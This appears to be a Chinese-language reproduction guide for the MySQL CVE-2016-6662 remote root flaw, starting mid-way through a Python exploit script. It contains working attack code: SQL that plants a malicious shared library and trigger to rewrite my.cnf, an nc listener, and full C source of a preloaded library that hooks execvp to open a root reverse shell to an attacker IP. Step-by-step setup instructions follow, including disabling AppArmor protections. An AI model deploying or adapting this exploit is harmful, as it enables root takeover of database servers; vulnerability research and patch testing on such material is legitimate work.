        cursor = dbconn.cursor()
        cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (hookandrootlib_hex, malloc_lib_path) )
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(5)
    # Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server
    info("Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded")
    try:
        cursor = dbconn.cursor()
        cursor.execute("CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"  )
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(6)
    # Finally, execute the trigger's payload by inserting anything into `poctable`. 
    # The payload will write to the mysql config file at this point.
    info("Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s" % args.TARGET_MYCNF )
    try:
        cursor = dbconn.cursor()
        cursor.execute("INSERT INTO `poctable` VALUES('execute the trigger!');" )
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(6)
    # Check on the config that was just created
    info("Showing the contents of %s config to verify that our setting (malloc_lib) got injected" % args.TARGET_MYCNF )
    try:
        cursor = dbconn.cursor()
        cursor.execute("SELECT load_file('%s')" % args.TARGET_MYCNF)
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(2)
    finally:
        dbconn.close()  # Close DB connection
    print ""
    myconfig = cursor.fetchall()
    print myconfig[0][0]
    info("Looks messy? Have no fear, the preloaded lib mysql_hookandroot_lib.so will clean up all the mess before mysqld daemon even reads it :)")
    # Spawn a Shell listener using netcat on 6033 (inverted 3306 mysql port so easy to remember ;)
    info("Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)" )
    listener = subprocess.Popen(args=["/bin/nc", "-lvp","6033"])
    listener.communicate()
    print ""
    # Show config again after all the action is done
    info("Shell closed. Hope you had fun. ")
    # Mission complete, but just for now... Stay tuned :)
    info("""Stay tuned for the CVE-2016-6663 advisory and/or a complete PoC that can craft a new valid my.cnf (i.e no writable my.cnf required) ;)""")
    # Shutdown
    shutdown(0)
下面是0ldSQLMySQLRCEexploit.py脚本要注入的共享库内容，当mysqld守护进程启动的时候，mysqldsafe会加载该恶意的共享库，然后会主动连接远程攻击者坚挺的6603端口，并给攻击者反弹一个root
shell。
python脚本首先会创建修改mysql配置文件，加入如下内容：
[mysqld] malloclib=mysqlhookandroot_lib.so
然后当mysqld启动的时候，mysqld_safe会加载.so文件中的恶意内容，
**然后.so文件中的execvp()函数首先会清理掉mysql配置文件中插入的垃圾内容，只保留[mysqld]这个字段，以确保mysqld服务能正常启动**
，之后就会向攻击者反弹一个root shell。在使用该文件的时候，需要调整一个接收shell的IP和端口，以及配置路径等。
使用如下命令进行编译：
    gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl
mysqlhookandrootlib.c内容如下：
    Full advisory URL:
    http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt
    */
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define ATTACKERS_IP "127.0.0.1"
    #define SHELL_PORT 6033
    #define INJECTED_CONF "/var/lib/mysql/my.cnf"
    char* env_list[] = { "HOME=/root", NULL };
    typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);
    static execvp_func_t old_execvp = NULL;
    // fork & send a bash shell to the attacker before starting mysqld
    void reverse_shell(void) {
        int i; int sockfd;
        //socklen_t socklen;
        struct sockaddr_in srv_addr;
        srv_addr.sin_family = AF_INET; 
        srv_addr.sin_port = htons( SHELL_PORT ); // connect-back port
        srv_addr.sin_addr.s_addr = inet_addr(ATTACKERS_IP); // connect-back ip 
        // create new TCP socket && connect
        sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
        connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
        for(i = 0; i 0) ftruncate(fileno(conf), cut_offset);
        fclose(conf);
        return 0;
    }
    // execvp() hook
    int execvp(const char* filename, char* const argv[]) {
        pid_t  pid;
        int fd;
        // Simple root PoC (touch /root/root_via_mysql)
        fd = open("/root/root_via_mysql", O_CREAT);
        close(fd);
        old_execvp = dlsym(RTLD_NEXT, "execvp");
        // Fork a reverse shell and execute the original execvp() function
        pid = fork();
        if (pid == 0) 
              reverse_shell();
        // clean injected payload before mysqld is started
        config_cleanup();
        return old_execvp(filename, argv);
    }
**复现测试流程：**  
1，创建一个测试用的数据库，并创建测试用户的账号和权限，如下：
    CREATE DATABASE pocdb;
    GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
    GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';
2，将存在的mysql配置文件的所属用户修改成mysql用户，如下：  
    # chown mysql:mysql /etc/mysql/my.cnf
    # ls -l /etc/mysql/my.cnf
    -rw-r--r-- 1 mysql mysql 3534 Sep 11 02:15 /etc/mysql/my.cnf
3，用attacker用户运行该exp，运行完毕重启mysql服务 首先，在.c文件中输入你的库路径； 接着，运行.py脚本。 如：
    attacker$ ./0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.1.10 -dbname pocdb -mycnf /etc/mysql/my.cnf
4，然后在定义的接收反弹shell的服务器用nc监听6033端口即可收到反弹的shell。
**详细漏洞测试过程** ，是在ubuntu 14.04中测试的。
1，安装mysql-server ,mysql-client
sudo apt-get install mysql-server mysql-client
2，安装gcc
sudo apt-get install build-essential
3，安装exp脚本中用到的mysql connector，下载地址
4，创建测试用的数据库，以及需要账号及权限
    mysql> create database pocdb;
    Query OK, 1 row affected (0.00 sec)
    mysql> grant file on *.* to 'attacker'@'%' identified by 'hello123';
    Query OK, 0 rows affected (0.00 sec)
    mysql> GRANT SELECT,INSERT,CREATE ON `pocdb`.* TO 'attacker'@'%';
    Query OK, 0 rows affected (0.00 sec)
注意上面这条中数据库名是用反引号括起来的。
5，编译mysqlhookandrootlib.c文件，编译之前，修改内容如下：
    #define ATTACKERS_IP "182.92.100.1"
    #define SHELL_PORT 1234
    #define INJECTED_CONF "/etc/mysql/my.cnf"
其中IP、端口是另外一台需要监听的服务器的，执行exp之后被攻击服务器会主动向上面的IP跟端口反弹一个root权限的shell。
my.cnf是我的测试环境中配置文件的默认位置。
**编译命令：**
    gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl
6，修改/etc/mysql/my.cnf的所属用户及组
    chown mysql:mysql /etc/mysql/mysql.cnf
7，唯一鸡肋的地方是需要对ubuntu的apparmor相关的配置，不然exp执行的时候会报错误6，会提示
    ERROR 29 (HY000): File '/etc/mysql/my.cnf' not found (Errcode: 13)
centos的话应该是需要关闭selinux，不过看漏洞介绍说不关闭这个的情况下也能利用，可能是描述有误吧。
修改方法：
    sudo vi /etc/apparmor.d/usr.sbin.mysqld
修改成如图所示：
修改完成之后执行：
    sudo /etc/init.d/apparmor reload
8，然后将编译好的.so文件以及.py文件放到同一个目录，执行如下命令：
    sudo python mysqlRECexploit.py -dbuser attacker -dbpass 'hello123' -dbhost 127.0.0.1 -dbname pocdb -mycnf /etc/mysql/my.cnf
执行成功后如图所示：
然后在之前设定的那个服务器上就会接收到root权限的shell，如图：
**引用**
【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析
【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）